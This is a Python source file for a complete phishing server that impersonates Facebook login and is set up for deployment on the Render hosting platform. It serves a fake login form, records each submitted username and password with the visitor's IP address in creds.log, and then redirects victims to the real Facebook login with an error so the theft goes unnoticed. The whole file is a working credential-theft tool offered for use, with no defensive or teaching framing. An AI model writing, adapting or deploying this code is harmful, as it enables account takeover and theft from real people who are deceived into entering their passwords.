import http.server
import socketserver
import urllib.parse
import logging
import os

# 1. ALIGNMENT: Render defines the port in an environment variable named "PORT"
# We must use quotes around "PORT" and "0.0.0.0"
PORT = int(os.environ.get("PORT", 10000)) 
LOG_FILE = "creds.log"
HTML_FILE = "facebook_login.html"

# 2. ALIGNMENT: Render terminates SSL at the load balancer. 
# Your internal code should run as standard HTTP.
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # 3. ALIGNMENT: Render's health checker pings "/" to see if your app is alive.
        # We ensure "/" returns a 200 OK status.
        if self.path == "/" or self.path == f"/{HTML_FILE}":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            if os.path.exists(HTML_FILE):
                with open(HTML_FILE, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"Server is live. (facebook_login.html missing)")
        else:
            # Fallback for other files (CSS, JS)
            super().do_GET()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        
        log_msg = f"Caught: user={username}, pass={password}, IP={self.client_address[0]}"
        logging.info(log_msg)
        print(log_msg)
        
        # Redirect back to real Facebook
        self.send_response(302)
        self.send_header("Location", "https://www.facebook.com/login/?error=invalid")
        self.end_headers()

    def log_message(self, format, *args):
        # Keep logs clean in Render console
        pass

def run_server():
    # 4. ALIGNMENT: Must bind to host 0.0.0.0 (as a string)
    # allow_reuse_address prevents "Address already in use" errors on redeploy
    socketserver.TCPServer.allow_reuse_address = True
    server_address = ("0.0.0.0", PORT)
    
    with socketserver.TCPServer(server_address, PhishHandler) as httpd:
        print(f"[+] Phishing Server aligned with Render requirements.")
        print(f"[+] Listening on {server_address[0]}:{server_address[1]}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            httpd.server_close()

if __name__ == "__main__":
    # Create the HTML file if it doesn't exist so the server doesn't error out
    if not os.path.exists(HTML_FILE):
        with open(HTML_FILE, "w") as f:
            f.write("<html><body><form method='POST'>User:<input name='username'>Pass:<input name='password' type='password'><input type='submit'></form></body></html>")
    
    run_server()
